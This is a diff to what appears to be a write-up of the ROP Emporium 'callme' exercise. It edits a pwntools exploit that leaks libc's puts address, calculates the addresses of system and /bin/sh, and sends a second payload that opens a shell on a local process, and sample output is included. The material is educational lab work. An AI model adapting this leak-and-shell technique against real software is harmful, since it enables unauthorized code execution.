@@ -389,21 +389,22 @@ conn = process()
 
 conn.recvuntil(b'> ')
 
-print("[*] sending payload 1")
+print(">>> sending payload 1")
 conn.send(payload1)
 
 # read in the output and parse it into an int
 conn.recvuntil(b"Thank you!\n")
 # bit of a hack but it works
 puts_addr = u64(conn.recv(6) + b'\x00\x00')
-print("[*] received libc_puts address %s" % hex(puts_addr))
+print(">>> received libc_puts address %s" % hex(puts_addr))
 
 # compute our final addresses from our leaked address and offsets
 libc_leak = puts_addr - LIBC_PUTS
-print("[*] libc leaked address is %s" % hex(libc_leak))
+print(">>> libc leaked address is %s" % hex(libc_leak))
 libc_system_leak = libc_leak + LIBC_SYSTEM
-print("[*] calculated system address is %s" % hex(libc_system_leak))
+print(">>> calculated system address is %s" % hex(libc_system_leak))
 libc_binsh_leak = libc_leak + LIBC_BINSH
+print(">>> calculated /bin/sh address is %s" % hex(libc_binsh_leak))
 
 # construct our second payload.
 
@@ -444,11 +445,12 @@ $ python shell.py
     NX:       NX enabled
     PIE:      PIE enabled
 [+] Starting local process '/home/sammy/Projects/binexp/ropemporium/3-callme/callme': pid 64146
-[*] sending payload 1
-[*] received libc_puts address 0x7fd5662715a0
-[*] libc leaked address is 0x7fd5661f6000
-[*] calculated system address is 0x7fd566245230
-[*] sending payload 2
+>>> sending payload 1
+>>> received libc_puts address 0x7fd5662715a0
+>>> libc leaked address is 0x7fd5661f6000
+>>> calculated system address is 0x7fd566245230
+>>> calculated /bin/sh address is 0x7fd5663b3115
+>>> sending payload 2
 [*] Switching to interactive mode
 Thank you!
 $ uname -a
